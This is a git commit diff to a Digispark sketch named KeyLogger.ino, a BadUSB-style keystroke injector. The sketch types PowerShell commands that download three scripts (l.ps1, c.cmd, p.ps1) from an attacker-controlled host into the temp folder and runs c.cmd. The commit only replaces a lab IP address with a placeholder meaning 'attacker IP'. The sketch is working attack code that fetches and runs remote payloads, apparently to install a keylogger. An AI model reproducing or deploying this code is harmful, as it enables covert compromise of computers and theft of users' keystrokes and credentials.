34a1ca1385711ae7d26ea171adbb516223fc7420
L0gic <95774215+baku01@users.noreply.github.com>
2023-01-31 22:49:44 -0300

    Update KeyLogger.ino

--- KeyLogger.ino
+++ KeyLogger.ino
@@ -9,11 +9,11 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1500);
-  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile('http://192.168.56.109/l.ps1',\"$env:temp/l.ps1\")");
+  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile('http://IPDOATACANTE/l.ps1',\"$env:temp/l.ps1\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.56.109/c.cmd',\"$env:temp/c.cmd\")");
+  DigiKeyboard.print("$WebClient.DownloadFile('http://IPDOATACANTE/c.cmd',\"$env:temp/c.cmd\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.56.109/p.ps1',\"$env:temp/p.ps1\")");
+  DigiKeyboard.print("$WebClient.DownloadFile('http://IPDOATACANTE/p.ps1',\"$env:temp/p.ps1\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("cd $env:temp;./c.cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
